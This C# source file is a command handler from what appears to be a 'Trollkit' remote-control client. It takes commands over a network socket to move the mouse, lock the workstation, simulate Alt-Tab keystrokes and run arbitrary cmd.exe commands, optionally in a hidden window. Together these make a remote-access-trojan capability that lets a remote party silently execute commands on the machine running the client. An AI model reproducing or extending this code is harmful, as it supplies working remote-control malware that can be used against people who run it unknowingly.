using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Windows.Forms;
using Trollkit_Library.Models;
using Trollkit_Library.Modules;
using System.Net.Sockets;
using Trollkit_Library;

namespace Trollkit_Client.Modules.CommandHandlers
{
    public class WindowsHandler : ICommandHandler
    {
		[DllImport("user32.dll")]
		public static extern bool LockWorkStation();
		public override bool HandleCommand(Socket s, TransferCommandObject obj)
        {
			switch (obj.Command)
			{
				case "MousePosition":
					return MousePosition(obj.Value);
				case "Command":
					return RunCommand(obj.Value);
				case "LockWindows":
					return LockWorkStation();
				case "AltTab":
					return AltTab();
			}

			return false;
		}

		private bool MousePosition(string coordinates)
		{
			try
			{
				string[] values = coordinates.Split(',');
				Cursor.Position = new Point(int.Parse(values[0]), int.Parse(values[1]));
				return true;
			}
			catch (Exception e)
			{
				BConsole.WriteLine("Windows Error: " + e.Message, ConsoleColor.Red);
				return false;
			}
		}

		private bool RunCommand(string command)
		{
			try
			{
				string[] values = command.Split(',');
				if (values[0] == "hidden")
				{
					Process process = new Process();
					ProcessStartInfo startInfo = new ProcessStartInfo();
					startInfo.WindowStyle = ProcessWindowStyle.Hidden;
					startInfo.FileName = "cmd.exe";
					startInfo.Arguments = $"/C c: & cd / & {values[1]}";
					process.StartInfo = startInfo;
					process.Start();
				}
				else if (values[0] == "show")
				{
					Process.Start("CMD.exe", $"/C c: & cd / & {values[1]} & pause");
				}
				else
				{
					Process.Start("CMD.exe", $"/C c: & cd / & {command} & pause");
				}

				return true;
			}
			catch (Exception e)
			{
				BConsole.WriteLine("Windows Error: " + e.Message, ConsoleColor.Red);
				return false;
			}
		}

		private bool AltTab()
		{
			try
			{
				Random number = new Random();
				Keyboard keyboard = new Keyboard();
				keyboard.Send(Keyboard.ScanCodeShort.MENU);
				keyboard.Send(Keyboard.ScanCodeShort.TAB);
				for (int i = 0; i < number.Next(2, 7); i++)
				{
					Thread.Sleep(10);
					keyboard.Send(Keyboard.ScanCodeShort.TAB);
				}
				keyboard.release(Keyboard.ScanCodeShort.MENU);
				keyboard.release(Keyboard.ScanCodeShort.TAB);
				return true;
			}
			catch (Exception e)
			{
				BConsole.WriteLine("Windows Error: " + e.Message, ConsoleColor.Red);
				return false;
			}
		}
    }
}
